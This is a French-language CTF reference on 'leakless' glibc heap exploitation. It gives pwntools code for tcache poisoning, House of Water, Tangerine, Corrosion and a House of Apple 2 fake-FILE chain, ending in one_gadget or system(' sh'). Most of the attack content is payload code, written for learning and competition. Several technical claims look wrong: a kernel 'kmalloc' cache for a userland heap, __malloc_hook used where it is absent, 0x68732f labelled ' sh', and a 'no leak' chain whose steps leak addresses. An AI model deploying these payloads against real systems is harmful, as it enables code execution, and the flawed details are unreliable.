# CTF Pwn — Leakless Heap Exploitation (glibc 2.32+)

L'ère du "leak first, exploit second" est révolue. Les techniques modernes permettent d'obtenir RCE sans aucune fuite d'adresse préalable. Ce fichier couvre les techniques **leakless** pour glibc 2.32–2.39+.

## Table des matières
- [Safe-Linking (glibc 2.32+) — rappel](#safe-linking-glibc-232--rappel)
- [House of Rust — Bypass Safe-Linking sans leak](#house-of-rust--bypass-safe-linking-sans-leak)
- [House of Water — tcache_perthread_struct attack](#house-of-water--tcache_perthread_struct-attack)
- [House of Tangerine — Leakless tcache AAW sans free()](#house-of-tangerine--leakless-tcache-aaw-sans-free)
- [House of Corrosion — global_max_fast corruption](#house-of-corrosion--global_max_fast-corruption)
- [Chaîne complète : Water + Apple 2](#chaîne-complète--water--apple-2)
- [Decision tree : quelle technique choisir ?](#decision-tree--quelle-technique-choisir-)

---

## Safe-Linking (glibc 2.32+) — rappel

```python
# fd mangled = fd_real XOR (chunk_addr >> 12)
# Pour déchiffrer : on a besoin du heap key
# heap_key = chunk_addr >> 12  (les 12 bits bas = offset dans la page)

# Obtenir le heap key sans leak :
# Allouer deux chunks de même taille dans le tcache
# Free chunk A → fd = NULL ^ heap_key = heap_key (lisible si UAF)
# heap_key = leaked_fd  (car NULL XOR key = key)

# Forger un fd manglé :
def mangle(ptr, heap_key):
    return ptr ^ heap_key

# Exemple : tcache poison avec safe-linking
heap_key = u64(leak_chunk_fd()) & ~0xfff  # les 52 bits hauts
target = libc.sym['__free_hook']
forged_fd = target ^ heap_key
# Overwrite fd du chunk freé avec forged_fd
# malloc() → retourne target → write primitive
```

---

## House of Rust — Bypass Safe-Linking sans leak

**Cible :** glibc 2.32–2.35 | **Prérequis :** UAF ou double-free, overwrite partiel possible

**Idée :** safe-linking protège fd mais PAS les chunks dans la tcache bins list elle-même. En corrompant partiellement le fd avec un seul octet connu, on peut forcer une allocation à un endroit prévisible.

```python
# House of Rust : partial fd overwrite (1-2 bytes)
# tcache bin entry : [count][fd_mangled]
# Si on connaît heap_key partiel (bas 12 bits = 0, donc key = addr >> 12)
# Et si PIE bas = 0 (toujours vrai pour heap), overwrite dernier octet

# Chunk A freé → fd = NULL ^ (A >> 12)
# Overwrite le dernier octet de fd → redirige vers offset connu dans heap
# (1/16 chance de succès si nibble bas inconnu, souvent adresse déterministe)

# Implémentation : brute-force nibble (16 tentatives max)
for nibble in range(16):
    target_fd = (heap_base + known_offset) ^ heap_key
    last_byte = (target_fd & 0xff) | nibble
    overwrite_byte(chunk_a_fd_addr, last_byte)
    
    # Tenter malloc : si succès → on a le bon nibble
    ptr = malloc(chunk_size)
    if ptr == expected_addr:
        break
```

---

## House of Water — tcache_perthread_struct attack

**Source :** [corgi.rip/posts/leakless_heap_1](https://corgi.rip/posts/leakless_heap_1/)  
**Cible :** glibc 2.32+ | **Révolutionnaire :** Safe-Linking ne protège PAS `tcache_perthread_struct`

### Pourquoi tcache_perthread_struct est vulnérable

```c
// Structure tcache_perthread_struct (dans le heap, au tout début)
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];   // 64 * 2 = 128 bytes
    tcache_entry *entries[TCACHE_MAX_BINS];  // 64 * 8 = 512 bytes
} tcache_perthread_struct;
// Total : 640 bytes, alloué dans kmalloc-1024
// Adresse : généralement heap_base + 0x10
```

**Vulnérabilité :** les `entries[]` sont des pointeurs bruts (non manglés par safe-linking). En obtenant un write primitive vers `tcache_perthread_struct`, on contrôle les 64 bins tcache → allocation arbitraire.

### Exploit

```python
from pwn import *

# Phase 1 : Obtenir un write sur tcache_perthread_struct
# (via overflow, off-by-one, UAF...)

# Phase 2 : Overwrite une entrée tcache pour pointer vers libc
# L'entrée [bin_index] dans entries[] est un pointeur direct vers le prochain chunk free
# Remplacer par l'adresse d'une target dans libc

# Exemple : mettre __malloc_hook dans le tcache bin de taille 0x20
tcache_perthread = heap_base + 0x10
entries_offset = 128 + 8 * 2  # entries[] pour bin de taille 0x20 (index 2)
target_entry = tcache_perthread + entries_offset

# Écrire __malloc_hook dans l'entrée tcache
write_primitive(target_entry, libc.sym['__malloc_hook'])

# Phase 3 : malloc(0x20) retourne __malloc_hook
hook_ptr = malloc(0x20)
write_to(hook_ptr, one_gadget)  # Overwrite __malloc_hook

# Phase 4 : trigger malloc → RCE
malloc(1)  # → one_gadget
```

### Variante leakless : Heap self-reference

```python
# Trick : écrire une adresse libc dans tcache SANS avoir leaké libc
# 1. Créer un chunk de taille appartenant au unsorted bin (>0x400)
# 2. Le free() → fd/bk pointent vers libc (main_arena)
# 3. Le chunk est dans tcache_perthread_struct.entries[]
# 4. Overwrite le count pour qu'il croie que des chunks sont dans ce bin
# 5. malloc() de la même taille retourne un pointeur DANS libc → leak automatique

# Phase de setup : free un large chunk pour mettre des ptrs libc dans le heap
malloc_and_free(0x500)  # fd/bk = main_arena + offset
# Maintenant heap contient des adresses libc → leakables via tcache_perthread
```

---

## House of Tangerine — Leakless tcache AAW sans free()

**Source :** [born0monday.me/posts/house-of-tangerine](https://born0monday.me/posts/house-of-tangerine/)  
**Cible :** glibc 2.39+ | **Unique :** ne requiert PAS de free(), uniquement malloc + overflow

```python
# Principe : Corrompre la tcache_perthread_struct via overflow dans un chunk adjacent
# En manipulant les counts[] et entries[], obtenir AAW sans jamais appeler free()

# Setup : allouer des chunks adjacents à tcache_perthread_struct
# tcache_perthread_struct est toujours dans le 1er chunk du heap

# Étape 1 : Obtenir un overflow dans le chunk B adjacent à perthread
# (overflow depuis chunk A vers chunk B, puis de B vers perthread)

# Étape 2 : Modifier tcache_perthread_struct.counts[i] → > 0
# Cela fait croire qu'il y a un chunk dans le bin i

# Étape 3 : Modifier tcache_perthread_struct.entries[i] → target address
# (pas de safe-linking car c'est dans perthread, pas dans un chunk freé)

# Étape 4 : malloc(size_for_bin_i) → retourne target address
# Write primitive sur target

# Implémentation concrète
def house_of_tangerine(overflow_chunk, target_addr, bin_size=0x20):
    bin_idx = (bin_size >> 4) - 1  # indice du bin pour taille bin_size
    counts_offset = bin_idx * 2    # counts[] offset dans perthread
    entries_offset = 128 + bin_idx * 8  # entries[] offset dans perthread
    
    # Payload pour corrompre perthread
    payload = b'\x00' * overflow_distance
    payload += p16(1)  # counts[bin_idx] = 1 (1 chunk disponible)
    # ... remplir jusqu'à entries[bin_idx] ...
    payload += p64(target_addr)  # entries[bin_idx] = target
    
    # Envoyer overflow
    overflow(overflow_chunk, payload)
    
    # Allouer : retourne target_addr
    return malloc(bin_size)
```

---

## House of Corrosion — global_max_fast corruption

**Source :** [github.com/CptGibbon/House-of-Corrosion](https://github.com/CptGibbon/House-of-Corrosion)  
**Cible :** glibc 2.27+ | **Prérequis :** unsorted bin attack (écrire dans global_max_fast)

```python
# global_max_fast : contrôle la taille max des fastbins
# Si corrompu à 0xFFFF → TOUT chunk freé va dans les fastbins
# Les fastbins n'ont PAS de safe-linking → écrire des addr libc partout

# Étape 1 : Unsorted bin attack pour écrire dans global_max_fast
# Corrompre bk d'un unsorted bin chunk pour pointer vers global_max_fast - 0x10
corrupted_bk = global_max_fast - 0x10
overwrite_bk(unsorted_chunk, corrupted_bk)
malloc(unsorted_chunk_size)  # → écrit une addr libc dans global_max_fast

# Étape 2 : Maintenant tous les chunks freés vont en fastbin
# free(chunk_near_target) → fd du chunk = contenu précédent de la zone
# Ce fd est l'addr libc précédemment dans global_max_fast

# Étape 3 : Position de la victime
# Un free() va écrire dans fastbin[size >> 4] = &fastbin[0] + (size >> 4) * 8
# Calculer la taille du chunk pour que fastbin[i] tombe sur une target dans libc

target = libc.sym['__free_hook']
fastbin_base = libc.sym['main_arena'] + 8  # fastbin[0] = main_arena.fastbinsY[0]
delta = target - fastbin_base
required_size = (delta // 8) * 16  # taille chunk pour atteindre target
```

---

## Chaîne complète : Water + Apple 2

Combinaison pour RCE complet sans aucun leak (glibc 2.34+, `__free_hook` absent).

```
Phase 1 — Heap leak (tcache fd trick)
  └─ Free chunk → fd = NULL XOR heap_key → heap_key connu

Phase 2 — Unsorted bin → libc leak
  └─ Large malloc/free → fd/bk = main_arena → libc calculable

Phase 3 — tcache_perthread_struct corruption (House of Water)
  └─ Overwrite entries[i] → pointer vers stdout FILE struct en libc

Phase 4 — FSOP via _IO_wfile_jumps (House of Apple 2)
  └─ Fake FILE struct : _flags = " sh\x00"
  └─ vtable chain → _IO_wfile_jumps → _IO_wfile_overflow
  └─ Appel interne : wfile_overflow(fp) → system(fp) où fp = " sh\x00"

Phase 5 — Trigger
  └─ malloc() ou fflush(stdout) → RCE
```

```python
# House of Apple 2 : fake FILE pour glibc 2.34+
# _IO_wfile_jumps permet d'appeler system(fp) quand fp->_flags = " sh"

def build_apple2_payload(fake_file_addr, system_addr, libc):
    IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    
    fake_file  = p64(0x68732f)           # _flags = " sh" (espace + sh + null)
    fake_file += p64(0) * 7              # _IO_read_ptr...
    fake_file += p64(1)                  # _IO_write_base (doit être != 0)
    fake_file += p64(2)                  # _IO_write_ptr (doit être > base)
    fake_file += p64(0) * 4              # autres fields
    fake_file += p64(system_addr)        # _IO_buf_base → system (via vtable chain)
    fake_file += p64(0) * 6              # padding
    fake_file += p64(fake_file_addr + 0xd8)  # vtable ptr = notre fake vtable
    
    # vtable : doit pointer vers zone proche de _IO_wfile_jumps
    # Trick : vtable ptr décalé de -0x18 pour passer la vérification
    fake_vtable = p64(IO_wfile_jumps - 0x18)  # vtable = _IO_wfile_jumps - 0x18
    
    return fake_file + fake_vtable
```

---

## Decision tree : quelle technique choisir ?

```
                    ┌─────────────────────────────┐
                    │ Quelle version de glibc ?    │
                    └─────────────────────────────┘
                           │                │
                    < 2.32                >= 2.32
                           │                │
                    Classic tcache    Safe-Linking actif
                    poisoning OK            │
                                    ┌───────┴───────┐
                                    │               │
                              free() dispo ?    free() interdit ?
                                    │               │
                           ┌────────┴────┐     House of Tangerine
                           │             │     (malloc-only)
                     Heap base       Heap base
                     connue ?         inconnue ?
                           │               │
                    House of Water    House of Rust
                    (direct perthread) (partial overwrite)
                           │
                    Libc base connue ?
                    ├── Oui → tcache poison + one_gadget
                    └── Non → Combine Water (leak) + Apple 2 (FSOP)
```

| Technique | glibc | Besoin free | Besoin leak | Difficulté |
|-----------|-------|-------------|-------------|------------|
| tcache poison classic | <2.32 | Oui | Partiel | Facile |
| House of Rust | 2.32+ | Oui | Non | Moyen |
| House of Water | 2.32+ | Oui | Non | Moyen |
| House of Tangerine | 2.39+ | **Non** | Non | Difficile |
| House of Corrosion | 2.27+ | Oui | Non (4 bits) | Difficile |
| Water + Apple 2 | 2.34+ | Oui | Non | Expert |
